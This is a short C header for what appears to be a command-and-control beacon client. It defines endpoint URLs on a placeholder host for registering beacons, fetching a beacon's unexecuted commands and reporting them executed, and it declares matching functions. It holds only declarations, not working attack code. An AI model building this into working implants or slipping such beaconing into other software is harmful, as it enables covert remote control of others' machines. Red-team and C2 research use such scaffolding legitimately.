#include "stdbool.h"

#define C2_API_ADDR "http://0.0.0.0:8080"

#define C2_API_BEACON C2_API_ADDR "/beacon/%d"
#define C2_API_BEACON_REGISTER C2_API_ADDR "/beacon/register"
#define C2_API_BEACON_COMMANDS C2_API_ADDR "/beacon/%d/commands"
#define C2_API_BEACON_UNEXEC C2_API_BEACON_COMMANDS "?unexec_only=true"

#define C2_API_COMMAND_REGISTER C2_API_ADDR "/command/register"
#define C2_API_COMMAND_EXECUTED C2_API_ADDR "/command/%d/executed"

int register_beacon(char* ip, char* hostname);
struct Beacon* get_beacon(int beacon_id);
struct Command** get_beacon_commands(int beacon_id, bool unexec_only);
